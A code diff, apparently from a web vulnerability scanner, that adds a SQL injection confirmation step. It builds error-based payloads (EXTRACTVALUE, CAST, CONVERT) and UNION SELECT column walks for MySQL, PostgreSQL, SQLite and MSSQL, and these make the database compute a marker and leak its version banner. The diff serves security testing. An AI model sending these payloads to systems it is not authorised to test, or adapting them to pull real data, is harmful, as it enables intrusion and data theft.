@@ -281,12 +281,126 @@ def _sqli_timing_confirm(oracle, payload: str, attack_class: str, delay_s: int =
     return None
 
 
+# -- strongest SQLi confirmation: DATA EXTRACTION (a DB-evaluated marker) -------
+# Confirming injection is not the same as PROVING exploitation. The error-signature,
+# boolean, UNION-count and timing signals above all show only "the DB parsed our
+# syntax" — none return a concrete value the DB actually COMPUTED. This step closes
+# that gap the way sqlmap does: it injects an arithmetic marker a*b (two random
+# factors, exactly like `_check_ssti`'s product trick) wrapped in '~' delimiters
+# (CHAR(126)/CHR(126)/0x7e) and looks for the DB-computed product "~<a*b>~" in the
+# response. The product itself NEVER appears in the probe text, so finding it proves
+# the engine evaluated our expression server-side — honest proof-of-exploitation
+# (a concrete DB-evaluated value), not a full data dumper.
+#
+# Two delivery channels, chosen so the syntaxes degrade gracefully across engines
+# (payloads grounded in PayloadsAllTheThings, "SQL Injection/<engine> Injection.md"):
+#   * error-based — forces the value into a DB error string; needs NO column count:
+#       MySQL/MariaDB  EXTRACTVALUE/UPDATEXML raise an XPATH error echoing their
+#                      (invalid) 2nd arg      ("MySQL Injection.md")
+#       PostgreSQL     CAST(text AS NUMERIC) raises "invalid input syntax for type
+#                      numeric: <text>"       ("PostgreSQL Injection.md")
+#       MSSQL          CONVERT(INT,<varchar>) raises "Conversion failed when
+#                      converting the varchar value '<text>'"  ("MSSQL Injection.md")
+#   * UNION-based  — SELECTs the marker across a column walk until the UNION balances
+#                      and the value renders; covers SQLite, whose loose typing has no
+#                      handy error-based channel, and any engine whose DB errors the
+#                      app suppresses          ("SQLite Injection.md")
+# String ops differ per engine: MySQL's `||` is logical OR unless PIPES_AS_CONCAT is
+# set (dev.mysql.com/doc/refman/8.0/en/logical-operators.html), so MySQL uses CONCAT;
+# PostgreSQL/SQLite/Oracle use `||`; MSSQL uses `+` with CAST(... AS VARCHAR). On the
+# error-based probes a `@@version`/`version()` token is appended, so a hit can also
+# quote the engine banner for free. Bounded (error-based ≤ wrappers*len(exprs); UNION
+# ≤ wrappers*len(exprs)*max_cols) and short-circuits on the first extracted value;
+# never raises (guarded by `_sqli_deep_confirm`).
+
+
+def _sqli_extract_exprs(a: int, b: int):
+    """DB-dialect expressions that evaluate to the '~<a*b>~' marker (a version token
+    appended to the error-based ones, where the engine exposes it for free). Returns
+    (product, needle, error_exprs, union_exprs)."""
+    product = a * b
+    arith = f"({a}*{b})"
+    # CHAR(126)=CHR(126)='~'. @@version (MySQL/MSSQL) / version() (PostgreSQL) ride
+    # along on the error-based channel as an optional, quoted-in-the-reason bonus.
+    error_exprs = [
+        ("MySQL/MariaDB EXTRACTVALUE",
+         f"EXTRACTVALUE(RAND(),CONCAT(CHAR(126),{arith},CHAR(126),@@version,CHAR(126)))"),
+        ("PostgreSQL CAST",
+         f"CAST(CHR(126)||({arith})::text||CHR(126)||version()||CHR(126) AS NUMERIC)"),
+        ("MSSQL CONVERT",
+         f"CONVERT(INT,CHAR(126)+CAST({arith} AS VARCHAR)+CHAR(126)+@@version+CHAR(126))"),
+    ]
+    union_exprs = [
+        ("MySQL/MariaDB", f"CONCAT(CHAR(126),{arith},CHAR(126))"),
+        ("PostgreSQL/SQLite/Oracle", f"'~'||({arith})||'~'"),
+        ("MSSQL", f"CHAR(126)+CAST({arith} AS VARCHAR)+CHAR(126)"),
+    ]
+    return product, f"~{product}~", error_exprs, union_exprs
+
+
+def _sqli_extract_confirm(oracle, payload: str, attack_class: str, max_cols: int = 5):
+    """DATA-EXTRACTION confirmation: prove the DB actually COMPUTED an injected value.
+
+    Injects an arithmetic marker a*b (random factors) and confirms only when the
+    DB-evaluated product "~<a*b>~" — which never appears literally in the probe —
+    comes back in the response, via an error-based (no column count) or UNION-based
+    (column walk) channel across MySQL/MariaDB, PostgreSQL, SQLite and MSSQL. On a
+    hit returns a HIGH-confidence Verification quoting the extracted value (and any
+    version token riding along); otherwise None. Bounded, short-circuits on the first
+    value, and never raises (see `_sqli_deep_confirm`)."""
+    a, b = random.randint(100, 999), random.randint(100, 999)
+    product, needle, error_exprs, union_exprs = _sqli_extract_exprs(a, b)
+
+    def _hit(resp, label, technique, want_version):
+        body = resp.body or ""
+        if needle not in body:
+            return None
+        extra = ""
+        if want_version:                     # grab the banner sitting just past the marker
+            m = re.search(re.escape(needle) + r"([^~<>]{3,60})", body)
+            if m:
+                vt = m.group(1).strip()
+                if re.search(r"\d|MariaDB|MySQL|PostgreSQL|SQL Server|SQLite|Oracle", vt, re.I):
+                    extra = f" and leaked the version token '{vt[:48]}'"
+        return Verification(True, 0.95,
+                            f"DATA EXTRACTION confirmed: the DB evaluated our injected arithmetic "
+                            f"{a}*{b}={product} and returned the delimited marker '{needle}' via "
+                            f"{label} {technique}{extra} — concrete proof the backend executed our "
+                            f"SQL server-side (not merely that the WAF let the payload pass)",
+                            attack_class)
+
+    # (1) error-based: cheapest, needs no column count — try it first.
+    for wrap in _sql_context_wrappers(payload):
+        lead = f"{wrap} AND " if wrap else "1 AND "
+        for label, expr in error_exprs:
+            v = _hit(_send(oracle, f"{lead}{expr}-- -"), label, "error-based extraction", True)
+            if v is not None:
+                return v
+
+    # (2) UNION-based: walk the column count until the UNION balances and the marker
+    #     renders (marker in every column so whichever one is displayed surfaces it).
+    for wrap in _sql_context_wrappers(payload):
+        for label, expr in union_exprs:
+            for n in range(1, max_cols + 1):
+                sel = ",".join([expr] * n)
+                probe = f"{wrap} UNION SELECT {sel}-- -" if wrap else f"UNION SELECT {sel}-- -"
+                v = _hit(_send(oracle, probe), label, f"UNION SELECT with {n} column(s)", False)
+                if v is not None:
+                    return v
+    return None
+
+
 def _sqli_deep_confirm(oracle, payload: str, attack_class: str):
     """Deeper SQLi confirmation used only after `_check_sqli`'s error-signature and
-    boolean-differential heuristics come up empty: a bounded UNION column-count walk,
-    then a time-based blind probe. Returns a positive Verification or None, and never
-    raises (verification must stay crash-proof)."""
+    boolean-differential heuristics come up empty: first a DATA-EXTRACTION probe that
+    tries to make the DB compute and return a concrete marker value (the strongest
+    signal), then the bounded UNION column-count walk, then a time-based blind probe.
+    Returns a positive Verification or None, and never raises (verification must stay
+    crash-proof)."""
     try:
+        hit = _sqli_extract_confirm(oracle, payload, attack_class)  # strongest: a DB-evaluated value
+        if hit is not None:
+            return hit
         hit = _sqli_union_confirm(oracle, payload, attack_class)
         if hit is not None:
             return hit
